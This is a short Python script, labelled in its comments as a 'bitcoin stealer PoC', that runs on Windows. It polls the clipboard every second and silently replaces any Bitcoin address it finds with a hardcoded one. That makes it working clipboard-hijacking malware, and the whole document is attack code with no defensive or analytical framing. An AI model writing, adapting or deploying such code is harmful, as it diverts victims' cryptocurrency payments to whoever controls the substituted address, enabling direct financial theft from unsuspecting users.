import win32clipboard
import time
import re

#botnet.biz bitcoin stealer PoC
#@author Tomáš Keske
#@since 16.12.2018

def isBitcoinAddress(data):
        search = re.search(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',data)

        if search is not None:
                return True

        return False

while True:

        btcAddress = "1Exui1tKdPhRLjJxhPX9YgpFjeVogfdciF"

        win32clipboard.OpenClipboard()

        data = win32clipboard.GetClipboardData()

        if isBitcoinAddress(data) is True:
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardText(btcAddress)

        win32clipboard.CloseClipboard()

        time.sleep(1)